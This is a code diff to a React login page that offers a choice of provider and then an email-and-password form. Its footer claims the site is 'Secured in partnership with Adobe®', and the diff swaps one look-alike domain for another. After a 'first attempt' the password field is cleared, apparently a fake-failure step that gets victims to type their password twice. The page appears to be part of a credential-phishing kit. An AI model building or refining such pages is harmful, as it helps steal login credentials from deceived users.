@@ -45,6 +45,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
 
   const handleSubmit = async (e: React.FormEvent) => {
     const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
+    // After the first attempt, the hook returns { isFirstAttempt: true }
     if (result?.isFirstAttempt) {
       setPassword('');
     }
@@ -54,7 +55,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
     setSelectedProvider(null);
     setEmail('');
     setPassword('');
-    resetLoginState(); // This is the added line
+    resetLoginState();
   };
 
   const handleProviderClick = (providerName: string) => {
@@ -89,7 +90,6 @@ const LoginPage: React.FC<LoginPageProps> = ({
       }}
     >
       {!selectedProvider ? (
-        // --- Provider Selection without Container Card ---
         <div className="w-full max-w-md">
           <div className="mb-8 text-center">
             <div className="flex justify-center mb-6">
@@ -124,11 +124,10 @@ const LoginPage: React.FC<LoginPageProps> = ({
           </div>
 
           <div className="mt-8 text-center">
-            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">© 2026 Xvaulttransfer.io. Secured in partnership with Adobe®.</p>
+            <p className="text-sm text-gray-800 font-medium drop-shadow-[0_1px_2px_rgba(255,255,255,0.6)]">© 2026 Xtranfervault.io. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       ) : (
-        // --- Login Form with Container ---
         <div className="w-full max-w-md bg-white/70 backdrop-blur-md rounded-2xl shadow-2xl overflow-hidden border border-white/20">
           <div className="p-8">
             <div className="flex justify-center mb-6">
@@ -179,7 +178,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
             </div>
           </div>
           <div className="bg-white/40 backdrop-blur-sm p-4 border-t border-white/20">
-            <p className="text-xs text-gray-600 text-center">© 2026 Xvaulttransfer.io. Secured in partnership with Adobe®.</p>
+            <p className="text-xs text-gray-600 text-center">© 2026 Xtranfervault.io. Secured in partnership with Adobe®.</p>
           </div>
         </div>
       )}
